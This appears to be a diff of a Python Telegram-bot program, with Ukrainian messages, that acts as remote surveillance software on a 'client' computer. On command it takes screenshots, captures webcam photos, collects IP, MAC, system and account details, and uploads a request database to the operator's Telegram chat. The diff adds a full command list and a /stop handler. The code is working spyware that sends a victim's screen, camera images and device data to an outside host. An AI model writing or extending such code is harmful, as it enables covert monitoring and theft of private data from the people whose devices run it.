@@ -171,9 +171,10 @@ def main():
                              f"Версія Python клієнта: {pv}")
             elif get_message_text(upd).lower() == "/screenshot":
                 pyautogui.screenshot('screenshot_pyautogui.png')
-                text = 'Екран клієнта'
+                send_message(get_chat_id(upd),
+                             "Фото екрана клієнта:")
                 uphoto = open("screenshot_pyautogui.png", "rb")
-                bot.send_photo(get_chat_id(upd), uphoto, text)
+                bot.send_photo(get_chat_id(upd), uphoto)
                 uphoto.close()
                 os.remove("screenshot_pyautogui.png")
             elif get_message_text(upd).lower() == "/camera":
@@ -183,12 +184,12 @@ def main():
                 ret, frame = cap.read()
                 cv2.imwrite('photo.png', frame)
                 cap.release()
+                send_message(get_chat_id(upd),
+                             "Фото з камери клієнта:")
                 uphoto = open("photo.png", "rb")
                 bot.send_photo(get_chat_id(upd), uphoto)
                 uphoto.close()
                 os.remove("photo.png")
-                send_message(get_chat_id(upd),
-                             "Фото з камери клієнта:")
             elif get_message_text(upd).lower() == "/infotxt":
                 send_message(get_chat_id(upd),
                              "Всі дані про клієнта в .txt форматі:")
@@ -206,6 +207,49 @@ def main():
             elif get_message_text(upd).lower() == "/battery":
                 send_message(get_chat_id(upd),
                              f"Інформація про батарею: {battery_info}")
+            elif get_message_text(upd).lower() == "/command":
+                send_message(get_chat_id(upd),
+                             "/start - Початок роботи")
+                send_message(get_chat_id(upd),
+                             "/help - Допомога")
+                send_message(get_chat_id(upd),
+                             "/allinfo - Подивитися всю інформацію про клієнта")
+                send_message(get_chat_id(upd),
+                             "/infotxt  - Подивитися всю інформацію про клієнта в .txt форматі ")
+                send_message(get_chat_id(upd),
+                             "/ip - Продивитися IP клієнтів")
+                send_message(get_chat_id(upd),
+                             "/mac - Подивитися MAC-адрес клієнта")
+                send_message(get_chat_id(upd),
+                             "/monitor - Подивитися розширення монітора клієнта")
+                send_message(get_chat_id(upd),
+                             "/camera - Подивитися фото з камери клієнта (Деяка затримка)")
+                send_message(get_chat_id(upd),
+                             "/screenshot - Подивитися фото екрана клієнта")
+                send_message(get_chat_id(upd),
+                             "/battery - Подивитися інформацію про батарею клієнта")
+                send_message(get_chat_id(upd),
+                             "/request - Подивитися запит клієнта")
+                send_message(get_chat_id(upd),
+                             "/pc - Подивитися ім'я пристрою клієнта")
+                send_message(get_chat_id(upd),
+                             "/name - Подивитися ім'я облікового запису клієнта")
+                send_message(get_chat_id(upd),
+                             "/system - Подивитися системні параметри клієнта")
+                send_message(get_chat_id(upd),
+                             "/cpu - Подивитись завантаженість ЦП клієнта")
+                send_message(get_chat_id(upd),
+                             "/cpu - Подивитись завантаженість ЦП клієнта")
+                send_message(get_chat_id(upd),
+                             "/memory - Подивитись завантаженість пам'яті клієнта")
+                send_message(get_chat_id(upd),
+                             "/data - Надіслати базу даних запитів з пристрою клієнта")
+                send_message(get_chat_id(upd),
+                             "/site - Посилання на сайт програми")
+                send_message(get_chat_id(upd),
+                             "/command - Подивитися список команд")
+                send_message(get_chat_id(upd),
+                             "/stop - Закінчити роботу програми")
             elif get_message_text(upd).lower() == "/allinfo":
                 send_message(get_chat_id(upd),
                              f"IP клієнта: {a}")
@@ -253,9 +297,10 @@ def main():
                 upfile_3.close()
                 os.remove("info.txt")
                 pyautogui.screenshot('screenshot_pyautogui.png')
-                text = 'Екран клієнта'
+                send_message(get_chat_id(upd),
+                             "Фото екрана клієнта:")
                 uphoto = open("screenshot_pyautogui.png", "rb")
-                bot.send_photo(get_chat_id(upd), uphoto, text)
+                bot.send_photo(get_chat_id(upd), uphoto)
                 uphoto.close()
                 os.remove("screenshot_pyautogui.png")
                 cap = cv2.VideoCapture(0)
@@ -264,20 +309,22 @@ def main():
                 ret, frame = cap.read()
                 cv2.imwrite('photo.png', frame)
                 cap.release()
+                send_message(get_chat_id(upd),
+                             "Фото з камери клієнта:")
                 uphoto = open("photo.png", "rb")
                 bot.send_photo(get_chat_id(upd), uphoto)
                 uphoto.close()
                 os.remove("photo.png")
-                send_message(get_chat_id(upd),
-                             "Фото з камери клієнта:")
             elif get_message_text(upd).lower() == "/data":
                 send_message(get_chat_id(upd),
                              f"База даних запитів з пристрою клієнта:")
                 upfile = open("ip.sl3", "rb")
                 bot.send_document(get_chat_id(upd), upfile)
                 upfile.close()
-
-
+            elif get_message_text(upd).lower() == "/stop":
+                send_message(get_chat_id(upd),
+                             f"Програма закінчила свою роботу.")
+                sys.exit()
             else:
                 send_message(get_chat_id(upd), "Я не знаю що мені робить :(")
             up_id += 1
